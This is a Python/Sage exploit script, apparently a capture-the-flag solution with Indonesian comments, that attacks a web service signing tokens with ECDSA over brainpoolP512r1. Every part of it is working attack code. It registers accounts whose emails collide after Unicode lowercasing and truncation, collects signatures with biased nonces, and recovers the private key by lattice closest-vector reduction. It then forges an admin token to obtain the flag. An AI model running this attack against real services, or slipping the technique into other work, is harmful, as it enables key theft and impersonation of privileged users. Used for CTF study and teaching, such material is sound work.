#!/usr/bin/env sage -python

import base64
import hashlib
import json
import secrets
import sys

import requests
from ecdsa.curves import BRAINPOOLP512r1
from sage.all import Matrix, ZZ, vector
from sage.modules.free_module_integer import IntegerLattice


BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"
SAMPLE_COUNT = 12

CURVE = BRAINPOOLP512r1
G = CURVE.generator
N = int(G.order())
ORDER_BYTES = (N.bit_length() + 7) // 8
NONCE_BOUND = 1 << 128

ADMIN_ACCOUNT = "whale@whale-tw.com"

# "a@" = 2 karakter.
# U+0130 lowercases menjadi "i" + U+0307, yaitu 2 karakter.
# 2 + 32767*2 = 65536, tepat sepanjang stored_account().
COLLISION_PREFIX = "a@" + "\u0130" * 32767

SELECTIONS = {
    "time": 0,
    "motion": 0,
    "place": 0,
    "seat": 0,
}


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64u_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def canonical_payload(account: str, message: str) -> str:
    return json.dumps(
        {"account": account, "message": message},
        ensure_ascii=False,
        sort_keys=True,
        separators=(",", ":"),
    )


def message_hash(account: str, message: str) -> int:
    raw = canonical_payload(account, message).encode()
    return int.from_bytes(hashlib.sha512(raw).digest(), "big")


def parse_token(token: str) -> dict:
    parts = token.strip().split(".")
    if len(parts) != 3 or parts[0] != "singen":
        raise ValueError("invalid token")

    payload = json.loads(b64u_decode(parts[1]).decode())
    signature = b64u_decode(parts[2])

    if len(signature) != ORDER_BYTES * 2:
        raise ValueError("invalid signature length")

    return {
        "account": payload["account"],
        "message": payload["message"],
        "r": int.from_bytes(signature[:ORDER_BYTES], "big"),
        "s": int.from_bytes(signature[ORDER_BYTES:], "big"),
    }


def request_ok(response, expected):
    if response.status_code not in expected:
        body = response.text[:300].replace("\n", " ")
        raise RuntimeError(
            f"HTTP {response.status_code} dari {response.url}: {body}"
        )


def collect_signatures(count: int) -> list[dict]:
    samples = []
    run_id = secrets.token_hex(8)
    password = "SingenSolve123!"

    print(f"[*] Mengumpulkan {count} signature...")

    for index in range(count):
        # Suffix berada setelah batas 65536 pada hasil lowercase.
        # Fingerprint tetap berbeda, tetapi account yang disimpan identik.
        email = COLLISION_PREFIX + f"{run_id}{index:04x}.x"

        session = requests.Session()

        response = session.post(
            BASE + "/register",
            data={"email": email, "password": password},
            allow_redirects=False,
            timeout=60,
        )
        request_ok(response, {302, 303})

        response = session.post(
            BASE + "/login",
            data={"email": email, "password": password},
            allow_redirects=False,
            timeout=60,
        )
        request_ok(response, {302, 303})

        response = session.post(
            BASE + "/api/generate",
            json=SELECTIONS,
            timeout=60,
        )
        request_ok(response, {200})

        result = response.json()
        if not result.get("ok"):
            raise RuntimeError(f"generate gagal: {result}")

        samples.append(parse_token(result["token"]))
        print(f"[+] Signature {index + 1}/{count}")

    accounts = {sample["account"] for sample in samples}
    messages = {sample["message"] for sample in samples}

    if len(accounts) != 1:
        raise RuntimeError("stored account tidak berkolisi")

    if len(messages) != 1:
        raise RuntimeError("generated message tidak identik")

    stored = samples[0]["account"]
    print(f"[+] Stored account identik, panjang = {len(stored)}")
    print(f"[+] Message: {samples[0]['message']}")

    return samples


def centered(value: int) -> int:
    value %= N
    if value > N // 2:
        value -= N
    return value


def nonce_difference_score(samples: list[dict], private_key: int) -> int:
    nonces = []

    for sample in samples:
        z = message_hash(sample["account"], sample["message"])
        nonce = (
            (z + sample["r"] * private_key)
            * pow(sample["s"], -1, N)
        ) % N
        nonces.append(nonce)

    return max(
        abs(centered(nonce - nonces[0]))
        for nonce in nonces[1:]
    )


def recover_private_key(samples: list[dict]) -> int:
    alpha = []
    beta = []

    for sample in samples:
        z = message_hash(sample["account"], sample["message"])
        s_inv = pow(sample["s"], -1, N)

        # k_i = alpha_i*d + beta_i mod N
        alpha.append((sample["r"] * s_inv) % N)
        beta.append((z * s_inv) % N)

    print("[*] Menjalankan lattice/CVP...")

    # Coba beberapa reference signature dan scaling agar lebih robust.
    for reference in range(min(4, len(samples))):
        indices = [i for i in range(len(samples)) if i != reference]

        A = [
            (alpha[i] - alpha[reference]) % N
            for i in indices
        ]
        C = [
            (beta[i] - beta[reference]) % N
            for i in indices
        ]

        dimension = len(A) + 1

        for multiplier in (1, 2, 4, 8):
            scale = (N // NONCE_BOUND) * multiplier

            basis = Matrix(ZZ, dimension, dimension)

            for i in range(len(A)):
                basis[i, i] = N * scale

            for i, coefficient in enumerate(A):
                basis[-1, i] = coefficient * scale

            # Koordinat terakhir menyimpan kandidat private key.
            basis[-1, -1] = 1

            target = vector(
                ZZ,
                [-constant * scale for constant in C] + [0],
            )

            lattice = IntegerLattice(basis, lll_reduce=True)

            for algorithm in ("nearest_plane", "embedding"):
                try:
                    closest = lattice.approximate_closest_vector(
                        target,
                        delta=0.99,
                        algorithm=algorithm,
                    )
                except Exception:
                    continue

                raw_candidate = int(closest[-1])

                for candidate in (
                    raw_candidate % N,
                    (-raw_candidate) % N,
                ):
                    score = nonce_difference_score(samples, candidate)

                    if score < NONCE_BOUND:
                        print(
                            f"[+] Private key recovered "
                            f"(ref={reference}, scale={multiplier}, "
                            f"algorithm={algorithm})"
                        )
                        print(f"[+] Maksimum nonce difference: {score.bit_length()} bits")
                        return candidate

    raise RuntimeError(
        "Lattice belum menemukan key. Naikkan SAMPLE_COUNT menjadi 16."
    )


def forge_token(private_key: int, account: str, message: str) -> str:
    z = message_hash(account, message)

    while True:
        nonce = secrets.randbelow(N - 1) + 1
        point = nonce * G
        r = int(point.x()) % N

        if r == 0:
            continue

        s = (pow(nonce, -1, N) * (z + r * private_key)) % N

        if s == 0:
            continue

        payload = canonical_payload(account, message).encode()
        signature = (
            r.to_bytes(ORDER_BYTES, "big")
            + s.to_bytes(ORDER_BYTES, "big")
        )

        return f"singen.{b64u(payload)}.{b64u(signature)}"


def main():
    info_response = requests.get(BASE + "/api/info", timeout=15)
    request_ok(info_response, {200})
    info = info_response.json()

    print(f"[*] Target: {BASE}")
    print(f"[*] Curve: {info['curve']}")
    print(f"[*] Nonce tail: {info['nonce_tail_bits']} bits")

    samples = collect_signatures(SAMPLE_COUNT)
    private_key = recover_private_key(samples)

    forged = forge_token(
        private_key,
        info["admin_account"],
        info["target"],
    )

    response = requests.post(
        BASE + "/api/verify",
        json={"token": forged},
        timeout=30,
    )

    try:
        result = response.json()
    except Exception:
        raise RuntimeError(response.text[:500])

    print(f"[*] Verify response: {result}")

    flag = result.get("flag")
    if flag:
        print(f"\n[FLAG] {flag}")
    else:
        raise RuntimeError("Token terbuat, tetapi flag tidak diterima")


if __name__ == "__main__":
    main()
